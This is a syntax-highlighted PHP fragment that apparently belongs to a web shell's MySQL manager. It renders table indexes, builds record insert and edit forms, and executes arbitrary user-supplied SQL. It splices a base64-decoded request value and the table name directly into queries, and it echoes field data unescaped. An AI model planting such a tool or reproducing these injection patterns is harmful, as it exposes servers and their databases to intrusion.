<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;td&gt;'</span>.$<span style="color: #ffeead;">row</span>[<span style="color: #99ffff;">'Column_name'</span>].($<span style="color: #ffeead;">row</span>[<span style="color: #99ffff;">'Sub_part'</span>] ? <span style="color: #99ffff;">'('</span>.$<span style="color: #ffeead;">ro</span><span style="color: #ffeead; text-decoration: underline;">w</span><span style="text-decoration: underline;">[</span><span style="color: #99ffff; text-decoration: underline;">'Sub_part'</span><span style="text-decoration: underline;">].</span><span style="color: #99ffff; text-decoration: underline;">')'</span><span style="text-decoration: underline;"> : </span><span style="color: #99ffff; text-decoration: underline;">''</span><span style="text-decoration: underline;">).</span><span style="color: #99ffff; text-decoration: underline;">'&amp;nbsp;&lt;/td&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;td&gt;'</span>.($<span style="color: #ffeead;">row</span>[<span style="color: #99ffff;">'Cardinality'</span>] ? $<span style="color: #ffeead;">row</span>[<span style="color: #99ffff;">'Cardinality'</span>] : <span style="color: #ffffff; background-color: #002451;">0</span>)<span style="text-decoration: underline;">.</span><span style="color: #99ffff; text-decoration: underline;">'&amp;nbsp;&lt;/td&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;td&gt;'</span>.$<span style="color: #ffeead;">row</span>[<span style="color: #99ffff;">'Collation'</span>].<span style="color: #99ffff;">'&amp;nbsp;&lt;/td&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;td&gt;'</span>.$<span style="color: #ffeead;">row</span>[<span style="color: #99ffff;">'Null'</span>].<span style="color: #99ffff;">'&amp;nbsp;&lt;/td&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;td&gt;'</span>.$<span style="color: #ffeead;">row</span>[<span style="color: #99ffff;">'Comment'</span>].<span style="color: #99ffff;">'&amp;nbsp;&lt;/td&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;/tr&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">tbfoot(</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   } <span style="color: #d1f1a9;">elseif</span> ($<span style="color: #ffeead;">doing</span> == <span style="color: #99ffff;">'insert'</span> || $<span style="color: #ffeead;">doing</span> == <span style="color: #99ffff;">'edit'</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">result</span> = <span style="color: #ffffff; background-color: #002451;">q(</span><span style="color: #99ffff;">'SHOW COLUMNS FROM '</span>.$<span style="color: #ffeead;">tablename</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">while</span> ($<span style="color: #ffeead;">row</span> = <span style="color: #ffffff; background-color: #002451;">mysql_fetch_array(</span>$<span style="color: #ffeead;">result</span>)) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">rowdb</span>[] = $<span style="color: #ffeead;">row</span>;
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">rs</span> = <span style="color: #ffffff; background-color: #002451;">array(</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> ($<span style="color: #ffeead;">doing</span> == <span style="color: #99ffff;">'insert'</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;h2&gt;Insert new line in '</span>.$<span style="color: #ffeead;">tablename</span>.<span style="color: #99ffff;">' table &amp;raquo;&lt;/</span><span style="color: #99ffff; text-decoration: underline;">h2&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   } <span style="color: #d1f1a9;">else</span> {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;h2&gt;Update record in '</span>.$<span style="color: #ffeead;">tablename</span>.<span style="color: #99ffff;">' table &amp;raquo;&lt;/h2</span><span style="color: #99ffff; text-decoration: underline;">&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">where</span> = <span style="color: #ffffff; background-color: #002451;">base64_decode(</span>$<span style="color: #ffeead;">base64</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">result</span> = <span style="color: #ffffff; background-color: #002451;">q(</span><span style="color: #99ffff;">"SELECT * FROM $tablename WHERE $where LIMIT</span><span style="color: #99ffff; text-decoration: underline;"> 1"</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">rs</span> = <span style="color: #ffffff; background-color: #002451;">mysql_fetch_array(</span>$<span style="color: #ffeead;">result</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;form method="post" action="'</span>.$<span style="color: #ffeead;">self</span>.<span style="color: #99ffff;">'"&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span>$<span style="color: #ffeead;">dbform</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">makehide(</span><span style="color: #99ffff;">'action'</span>,<span style="color: #99ffff;">'mysqladmin'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">makehide(</span><span style="color: #99ffff;">'tablename'</span>,$<span style="color: #ffeead;">tablename</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;table border="0" cellpadding="3" cellspacing="0"&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">foreach</span> ($<span style="color: #ffeead;">rowdb</span> <span style="color: #d1f1a9;">as</span> $<span style="color: #ffeead;">row</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> ($<span style="color: #ffeead;">rs</span>[$<span style="color: #ffeead;">row</span>[<span style="color: #99ffff;">'Field'</span>]]) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">value</span> = <span style="color: #ffffff; background-color: #002451;">htmlspecialchars(</span>$<span style="color: #ffeead;">rs</span>[$<span style="color: #ffeead;">row</span>[<span style="color: #99ffff;">'Field'</span>]]);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   } <span style="color: #d1f1a9;">else</span> {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">value</span> = <span style="color: #99ffff;">''</span>;
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">thisbg</span> = <span style="color: #ffffff; background-color: #002451;">bg(</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;tr class="'</span>.$<span style="color: #ffeead;">thisbg</span>.<span style="color: #99ffff;">'" onmouseover="this.className=\</span><span style="color: #99ffff; text-decoration: underline;">'focus\';" onmouseout="this.className=\''</span><span style="text-decoration: underline;">.$</span><span style="color: #ffeead; text-decoration: underline;">thisbg</span><span style="text-decoration: underline;">.</span><span style="color: #99ffff; text-decoration: underline;">'\';"&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> ($<span style="color: #ffeead;">row</span>[<span style="color: #99ffff;">'Key'</span>] == <span style="color: #99ffff;">'UNI'</span> || $<span style="color: #ffeead;">row</span>[<span style="color: #99ffff;">'Extra'</span>] == <span style="color: #99ffff;">'auto_incre</span><span style="color: #99ffff; text-decoration: underline;">ment'</span><span style="text-decoration: underline;"> || $</span><span style="color: #ffeead; text-decoration: underline;">row</span><span style="text-decoration: underline;">[</span><span style="color: #99ffff; text-decoration: underline;">'Key'</span><span style="text-decoration: underline;">] == </span><span style="color: #99ffff; text-decoration: underline;">'PRI'</span><span style="text-decoration: underline;">) {</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;td&gt;&lt;b&gt;'</span>.$<span style="color: #ffeead;">row</span>[<span style="color: #99ffff;">'Field'</span>].<span style="color: #99ffff;">'&lt;/b&gt;&lt;br /&gt;'</span>.$<span style="color: #ffeead;">row</span>[<span style="color: #99ffff;">'Type'</span>].<span style="color: #99ffff; text-decoration: underline;">'&lt;/td&gt;&lt;td&gt;'</span><span style="text-decoration: underline;">.$</span><span style="color: #ffeead; text-decoration: underline;">value</span><span style="text-decoration: underline;">.</span><span style="color: #99ffff; text-decoration: underline;">'&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   } <span style="color: #d1f1a9;">else</span> {<span style="color: #ff9da4; background-color: #003f8e;">                            </span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;td&gt;&lt;b&gt;'</span>.$<span style="color: #ffeead;">row</span>[<span style="color: #99ffff;">'Field'</span>].<span style="color: #99ffff;">'&lt;/b&gt;&lt;br /&gt;'</span>.$<span style="color: #ffeead;">row</span>[<span style="color: #99ffff;">'Type'</span>].<span style="color: #99ffff; text-decoration: underline;">'&lt;/td&gt;&lt;td&gt;&lt;textarea class="area" name="insertsql['</span><span style="text-decoration: underline;">.$</span><span style="color: #ffeead; text-decoration: underline;">row</span><span style="text-decoration: underline;">[</span><span style="color: #99ffff; text-decoration: underline;">'Field'</span><span style="text-decoration: underline;">].</span><span style="color: #99ffff; text-decoration: underline;">']" style="width:500px;height:60px;overflow:auto;"&gt;'</span><span style="text-decoration: underline;">.$</span><span style="color: #ffeead; text-decoration: underline;">value</span><span style="text-decoration: underline;">.</span><span style="color: #99ffff; text-decoration: underline;">'&lt;/textarea&gt;&lt;/td&gt;&lt;/tr&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> ($<span style="color: #ffeead;">doing</span> == <span style="color: #99ffff;">'insert'</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;tr class="'</span>.<span style="color: #ffffff; background-color: #002451;">bg(</span>).<span style="color: #99ffff;">'"&gt;&lt;td colspan="2"&gt;&lt;input class="bt</span><span style="color: #99ffff; text-decoration: underline;">" type="submit" name="insert" value="Insert" /&gt;&lt;/td&gt;&lt;/tr&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   } <span style="color: #d1f1a9;">else</span> {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;tr class="'</span>.<span style="color: #ffffff; background-color: #002451;">bg(</span>).<span style="color: #99ffff;">'"&gt;&lt;td colspan="2"&gt;&lt;input class="bt</span><span style="color: #99ffff; text-decoration: underline;">" type="submit" name="update" value="Update" /&gt;&lt;/td&gt;&lt;/tr&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">makehide(</span><span style="color: #99ffff;">'base64'</span>, $<span style="color: #ffeead;">base64</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;/table&gt;&lt;/form&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   } <span style="color: #d1f1a9;">else</span> {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">querys</span> = @<span style="color: #ffffff; background-color: #002451;">explode(</span><span style="color: #99ffff;">';'</span>,$<span style="color: #ffeead;">sql_query</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">foreach</span>($<span style="color: #ffeead;">querys</span> <span style="color: #d1f1a9;">as</span> $<span style="color: #ffeead;">num</span>=&gt;$<span style="color: #ffeead;">query</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> ($<span style="color: #ffeead;">query</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">"&lt;p&gt;&lt;b&gt;Query#{$num} : "</span>.<span style="color: #ffffff; background-color: #002451;">htmlspecialchars(</span>$<span style="color: #ffeead;">query</span>,<span style="color: #bbdaff;">EN</span><span style="color: #bbdaff; text-decoration: underline;">T_QUOTES</span><span style="text-decoration: underline;">).</span><span style="color: #99ffff; text-decoration: underline;">"&lt;/b&gt;&lt;/p&gt;"</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">switch</span>(<span style="color: #ffffff; background-color: #002451;">qy(</span>$<span style="color: #ffeead;">query</span>))
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">case</span> <span style="color: #bbdaff;">0</span>:
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;h2&gt;Error : '</span>.<span style="color: #ffffff; background-color: #002451;">mysql_error(</span>).<span style="color: #99ffff;">'&lt;/h2&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">break</span>;<span style="color: #ff9da4; background-color: #003f8e;">  </span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">case</span> <span style="color: #bbdaff;">1</span>:
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> (<span style="color: #ffffff; background-color: #002451;">strtolower(substr(</span>$<span style="color: #ffeead;">query</span>,<span style="color: #ffffff; background-color: #002451;">0</span>,<span style="color: #ffffff; background-color: #002451;">13</span>)) == <span style="color: #99ffff;">'sele</span><span style="color: #99ffff; text-decoration: underline;">ct * from'</span><span style="text-decoration: underline;">) {</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">allowedit</span> = <span style="color: #ffffff; background-color: #002451;">1</span>;
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> ($<span style="color: #ffeead;">getnumsql</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">tatol</span> = <span style="color: #ffffff; background-color: #002451;">mysql_num_rows(q(</span>$<span style="color: #ffeead;">getnumsql</span>));
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">multipage</span> = <span style="color: #ffffff; background-color: #002451;">multi(</span>$<span style="color: #ffeead;">tatol</span>, $<span style="color: #ffeead;">pagenum</span>, $<span style="color: #ffeead;">pa</span><span style="color: #ffeead; text-decoration: underline;">ge</span><span style="text-decoration: underline;">, $</span><span style="color: #ffeead; text-decoration: underline;">tablename</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
